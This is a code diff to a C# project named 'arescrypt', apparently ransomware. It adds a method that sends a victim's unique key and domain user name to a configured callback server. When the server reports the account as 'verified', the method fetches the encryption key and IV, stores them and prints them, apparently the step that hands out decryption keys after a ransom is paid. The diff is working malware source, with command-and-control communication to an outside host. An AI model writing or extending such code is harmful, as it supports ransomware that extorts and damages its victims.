@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Net;
 using Newtonsoft.Json.Linq;
+using System.Collections.Generic;
 
 namespace arescrypt
 {
@@ -50,6 +51,40 @@ namespace arescrypt
                 } catch (WebException exc)
                 { Console.WriteLine("Caught exception: " + exc.Message); return false; }
             }
+        }
+
+        public List<string> GetCryptoKeys()
+        {   // This method ONLY needs to be called when it has been determined that the account has been verified properly.
+
+            string url = Configuration.callbackURL +
+                "?uniqueKey=" + userData.getUniqueKey() +
+                "&userDomUser=" + Configuration.userDomUser;
+
+            using (WebClient wc = new WebClient())
+            {
+                try
+                {
+                    string response = wc.DownloadString(url);
+                    JToken jsonObject = JObject.Parse(response);
+                    if((bool)jsonObject.SelectToken("verifiedAccount")) // The account has been verified.
+                    {
+                        userData = Miscellaneous.GetDATFileData();
+
+                        userData.encKey = (string)jsonObject.SelectToken("encKey");
+                        userData.encIV = (string)jsonObject.SelectToken("encIV");
+
+                        Miscellaneous.SetDATFileData(userData);
+
+                        Console.WriteLine("Account Verified? " + (bool)jsonObject.SelectToken("verifiedAccount"));
+                        Console.WriteLine("Encryption Key: " + userData.encKey);
+                        Console.WriteLine("Encryption IV: " + userData.encIV);
+                    }
+                }
+                catch (WebException exc)
+                { Console.WriteLine("Caught exception: " + exc.Message); return new List<string> { exc.Message }; }
+            }
+
+            return new List<string> { };
         }
         
     }
